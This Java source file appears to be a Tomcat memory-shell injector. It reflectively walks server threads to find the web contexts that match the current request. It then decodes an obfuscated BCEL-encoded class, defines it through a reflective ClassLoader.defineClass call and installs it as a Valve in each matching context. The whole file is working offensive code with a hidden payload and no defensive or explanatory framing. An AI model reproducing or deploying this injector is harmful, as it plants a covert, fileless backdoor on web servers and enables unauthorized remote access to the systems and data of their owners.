package source;

import org.apache.catalina.Valve;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;


public class addValve {
    private String uri;
    private String serverName;
    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();
    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();

    public addValve() {
        super();
        this.getThread();
        ArrayList<StandardContext> standardCtx = this.getSTC();
        String s = "$l$8b$I$A$A$A$A$A$A$A$8dW$Jx$T$d7$R$fe$9fu$ecz$b5$5c$C$DK$c2$R$c2$n$hc$R$O$Hd$87b$T$In$8c$edZ$60$w$9c4$5dVO$d6$e2$b5$a4$ec$ae$8c$9d$96$deM$ef$x$3dI$8f$f4HK$9b$9e$a4$ed$CqBi$da$sm$da$a6$f7$7d$9f$a1w$9b6$bd$h$3aO$x$h$c9$88$c3$df$e7$7d$ef$cd$cc$9b7o$e6$9fy$a3G$9e$bc$ef$U$80$8dLU$b0$Nc2$c6$V$dc$86g$c9x$b6$826$i$W$8b$e7$c8x$ae$8c$e7$89$e9$f3e$bc$m$82$X$e2E2$5e$ac$e0v$bcD$c2K$85$dc$cb$U$cc$c4$cb$F$e5$V$S$5e$a9$m$w4q1$beJ$c6$90$8cn$F$af$c6k$c4$e7$b52$5e$a7$e0$O$bc$5e$c6$80$847HH$d5$e3$8dx$93$82$c5x$b3$82$b7$e0$88$84$3b$V$y$c7$988$ee$ad$K$de$86$b7$8b$e5$3b$84$ee$bb$q$bcS$n$e9w$J$c1w$8b$z$efQ$Q$c3a$Jw$xx$K$de$h$c1$fbpT$c1$fb$f1$Ba$d3$3d2$3e$u$c6$P$J$ca$87$V$7c$E$l$95$f01$F$adB$f71$dc$xf$lW$f0$J$7cR$82$t$W$c7$85$f4$J$F$tq$9f$84$J$J$f73$84$db$cd$9c$e9ne$I$c4$g$H$Y$82$db$f3i$ce0$ab$db$cc$f1$9e$e2$c8$Bn$ef$d1$PXD$89v$e7$N$dd$g$d0mS$ac$cb$c4$a0$9b5$j$86H$f7$80n$8drs$a4$60$b5$91F37$9a$l$sn$7f$ac$3bo$P$c5$f5$82ndy$dc$d0$5d$dd2sz$dc$c8$e7r$dcp$f3v$bc$9f$dfZ$e4$8e$dbvI1$a7$90$cf9$bcM$Y$c8$86$85$z$H$f5Q$3dn$e9$b9$a1x$d2$b5$cd$dc$Q$j$x9$dcq$cc$7c$8eaY$89$3d$Ww$b8$3djq7$9eu$ddB$7c$X$7d$92$be$E$J3$83$a1$a1$yf$d8$e3$F7$l$dfn$W$b2$dc$W$8a$b2$ba$93$dd$ad$X$Y$e6$fa$e7$U$5d$d3$8a$ef$f2$89$c4$af7$ac$db$ba$f3z$9a$db$M$L$w$y$d9n$e9$8e$e33$84$X$f4$d2$9aa$cet$RbF$d2$3cC$O$$K$y$aa$90$b0y$c6$a2$5b$c7ws7$9bO$L$3din$94BR7$d8I$O$b7L$c7$q$f3$f9$a4$f9$fe$ae$jc$G$_$b8$fe$d5$ea$cc$dc$U$d3$cc$c7$bbr$85$a2KN$e2$fa$88$60$e6$e9$bc$a5S$cc$ceq$97w$d8$b6$3e$de$5bt$x$c5B$H$88A$92L$a7$ff$$$c2$861$92$s$c7$d8$7e$bc$YV_f$60$Zd$bb$i$3c$86K$a3$a1$if$86$f9$d5$60$h$_L$Cn$detg$b67m$r$f9$ZIW7$86$v$3c$r$b1$S$b4$l$90p$8aPO$89$p$e1S$94$V$M$ca$94$97$i$J$a7$r$7c$9aH$c9$7c$d16$f8NS$e8$9e9$F$e2$Wq$88$8a$O$90$c7$c3$b7$98$ZK$l$o$85$w$k$c4g$Y$a0$e2$b3$f8$9c$8a$87$f00$c5$a3$af7$b9$87a$f6$fa$ccz$be$r$b3q$9d$d1$9a$de$92$d17$5e$ab$e2$f3$f8$C$f9$ae$u$e1$R$V_$c4$97$c8$87$j$3b$92$S$be$ac$e2Q$7c$85bP$85$3d$a7$c0$8dx$92$h6wo$e4$e3IZ$a9$f8$w$be$sL$f8$ba$8ao$e0$9b$E$a3$f3$a0$a8$e2$5b$f8$b6$84$ef$a8$f8$$$be$a7$e2$fb$f8$B$c5$5dH$b5$I$f7$b4T$c0Q$c2$PU$fc$I$3f$a6$bc$9e$e6$3e$J$3fQ$f1S$ecU$f13$fc$5c$c2$_T$fc$S$bf$o$ff$3b$c5$5c$7c$c4t$8cxgGrG$eb$c6$ebK$Y$b4U$fc$g$8fI8$a3$e27xX$c5o$f1$3b$V$bf$c7$l$e8$fe$e7$d4$f6$k8H$e1T$f1G$fcI$c5$$$fcY$c5_$f08$a5R$N$b0$aa$f8$x$fe$s$e1$J$n$d7$r$e1$ef$w$fe$81$7f$aa$f8$97p$y$5b$a6$e2$df$f8$8f$8a$ff$e2$7f$S$9eTq$96hX$7cQ$e0R$a0U$c6X$9d$ca$C$yH$e1WY$88$85$ab$8c$f3$8b$85$ca$a4$92o$99$y$b1z$95$v$yBI$3d$V$7c$86$V$b5p$3a$w$f8N$bc$q$d6$a9$L$3c$af$bc$ac$i$60Xuy$b0$9f$f4Qu$ceVR$7b$a7$3c$c7$b0$a4$ba$c4$r$fd$b1B$40$j$e2n$9fn$eb$p$dc$V$85jU$ec$fc$9a$d9X$ab$8c$86$c9l$dd$a2$dco$a8$dc$e1G$b5$adq$3fy$8a$U$fb$d5$89$d21VS$87B$o$c9$c9j$bc$bc$ys$d1z$bc$e4$e2$STG$c8$p$e4$fb$o$b9iu$8d$ab$d40u$a0$ec$bai$F$9e$8a$_Y$d7$95s$5c$3dg$90$b6$c6$L$3a$e6$fc$97A$a6$9d$9d$7ee$M$c6$gE$3d$5e$Q$h$ec$ac$b1_$3c$a4$e2Y$V$C$5d$3e$df$e1F$d16$dd$f18$rxI$m$407b$d8$5c$c3$cb5$$s$3e$a9$K$d7$7b$b2$84$V$8a$c7$M$3a$c3$e69wr$5d$j$l$9fJ$3b$h$e8$k$db$f39$97$8f$b9$VU$82A$ab$S$af$7e$cf$gj2$I$O$WM$ca$P$d9$caK$80l$f2$f9$9bs$8e$d4EV$M$J$3d$c1$3d$a9$be$j$c4$o$d3$a8$daX$ba$cd$d3$93$u$dbVC$ed$e0yj$h$_$f6$8a$$$bc$Q$8f$7c$e6p$b7$c30$E$d0$fc$9e$s$b6_$84G$c0$bc$9f$fbw$5c4$e9$XQy$8a$99$M$t$e3$7c$9ex$abjsJO$9f$9e$W$7d$U$r$a3$ff$88$fb$S$b4$a5$96$9f$E$9c$a4t$7e$tU$H$aaAa$C$96O$g$V$a8$ef$cd$88$5d$5d$95w$y$7b$8e$y$d8R$DC$83$97$J$a2H$8e$l$3a$97$M$d5x$99$S$92$c8$X$3d$E$W$w$c0$qP$ab$9c$95$ca$oIj$XdVE$bd$bf$98s$cd$R$eeW$8a$a9EC$d5$e9er$9b$e82m$93$Ka$c8$vX$o$a5j$e5$7f$e3$60$ad$3a$U$e4c$9c$g$bdX$ac$G$b7$f2$a8$3e$3b$_$e2_$8d$cc2$91$fa$82R$bd$a8$a8$c8$L$w$e0P$dd$5e$F$fd$b4$L$89$e0Q$db$U$3aD$ZO$X$93h$dd$d55$89$aa$7d$82hW$ab$e9$p$9b$ca$M$R$U7$3f$f5$c0$95$b5$NT$3c$E$V$c2$a4$bb$mVVnZ$c1$9e$aaD$b8$8a$7e7l$83$f8$ab$a3$X$94z$g$fan$a7$d5$G$88$X$V$I5$j$H$3bVb_O_$85F$606$82$98$83$j$Q$ddNI$I$3bq$D$8dL$3c$d5$qA$K$C7$n$8c$ZD$g$5b$T$ad$f3$Q$e8Y$fb$Q$db$bb6$g$f4$Q$ba$93u$af$f1$Q$8eJ4$3f$823Q9$R$a4u$7d$o$a4$85$a2$8a$W$3c$89H$AQ$f5$Ef$q$c2Z84$81$99$v$8d$b6$cd$8a$aa$c71$db$c3$9c$JDS$c717$niRt$kml$d8G$93$f9$cd$e5$c9$C$z$qf$t$b0$d0$83$96$9059$ba$c8$c3$V$89z$ad$3eze$f8$B$yN$F$a2K$92$a9$e0$bdX$9aL$85$c4$d7$c3$b2$84$a2$vt$c2UZx$C$cbI$f7$d5$a4u$85$87$95$kVyX$9d$88h$8a$s$d3$deX$w$a0Eho$e0$E$gi$b3$W9$r$s$k$9aNcqB$d5T$Pk4$baS$f3$be$a3$YM$E$9b$3c$b4$aci$3e$89x$AG$919$81uk$3d$5c$T$5d$efa$83$87$8d$k6$r$82$Th$a5$c3$aeM$84$e6$Eq$bf$9c$I$d7$b5JZP$L$7b$d8$9cj$95$ea$ee$c2l$z$a4$85$D$N$a4r$cb$d1$b3g$e8$82$89$J$b4$a5$c4$fd$da$8f$e3$3a$P$5b$8fbf$d5$v$b3z$w$96$c7$u$O$cb$f08$9e$c0Z$8aB$96$N$d3$Y$y$c5$f0$O$ac$a0$ef$7cHX$80yXHR$8b$88r$F$9ap$r6$d1o$cav$yA$l$96$oE$9c$D$E$90a$fa$f9Y$c4$d58LR$b7c$r$ee$c6$w$dc$83$d5$d4$ef$c6$f0$Y$g$e9$8cf$3a$a5$89$da$b35$ac$O$cd$y$84$W$a6$n$ce$96c$jk$c45$ac$Z$ebY$C$h$d8$N$d8$c4$f6$a3$95$dd$8c$cd$y$8bv$b2$u$c1$y$b4$b1C$b8$ae$84$a5$d3$98K$t$3c$8a$a7$e2F$b2$b4$89z$e4n$ec$sl$b5$c3C$Pz$JO$v$i$n$cb$9eF$96$l$s$8b$fa$91$84L$WY$d8$83$bd$a8$t$bbz0$80$7d$84$d1$H$b1$OO$t$e9$I$d9$X$c1$7e$e2$8a$e61$82A$dc$84$m$d9$d6$81$9b$f1$M$9a$z$c7f$dc$82g$o$q$ec$84N$3b$c2dm$L$dd$da$a03$q$a6$pM$b6$E$c8J$7fo$40$e0$b9$8cu1$e3$c8$I$fc$d3l$IY$f2$b7Y$ce$I$df$a6$83d$d30Q$fa$n$9f$r$HQ$cfiI$a064$t$n$Pj2$L$b3$ce$92$t$e5J$b2$84$5b$rPC$be$84$b4$$$3a$8b$86i$9b$a8$e7U$3aic$E$O$e9$N$d3$89$$$f9$81a$b4$94$9f$87$fe$PC$fa$5db$cb$Q$A$A";
        Object o=null;
        try {
            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
            byte[] d = com.sun.org.apache.bcel.internal.classfile.Utility.decode(s,true);
            Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
            Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            o = ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (StandardContext standardCtx_ : standardCtx) {
            try { standardCtx_.addValve((Valve) o); }catch (Exception e){ continue; }
        }
    }

    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException e) {
            } catch (IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public void getThread() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = this.getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                this.serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null) {
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null) {
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "uriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null) {
                    this.uri = uriMB.toString();
                }
                if (this.uri == null) {
                    this.uri = uriMB.getString();
                }

                this.getStandardContext();
                return;
            }
        }
    }

    public void getStandardContext() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        return;
                    }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                } catch (Exception e) {
                }
                if (engine == null) {
                    engine = (StandardEngine) getField(service, "engine");
                }
                children = (HashMap) getField(engine, "children");

                StandardHost standardHost = null;
                Iterator<Map.Entry<String, StandardHost>> entryIterator = children.entrySet().iterator();
                while (entryIterator.hasNext()) {
                    Map.Entry<String, StandardHost> entry = entryIterator.next();
                    standardHost = entry.getValue();
                    children = (HashMap) getField(standardHost, "children");
                    Iterator iterator = children.keySet().iterator();
                    while (iterator.hasNext()) {
                        String contextKey = (String) iterator.next();
                        if (!(this.uri.startsWith(contextKey))) {
                            continue;
                        }
                        StandardContext standardContext = (StandardContext) children.get(contextKey);
                        this.standardContext_.add(standardContext);
                    }
                }
            }
        }
    }

    public ArrayList<StandardContext> getSTC() {
        for (int i = 0; i < this.standardContext_.size(); i++) {
            if (!this.standardContext__.contains(this.standardContext_.get(i)))
                this.standardContext__.add(this.standardContext_.get(i));
        }
        return this.standardContext__;
    }
}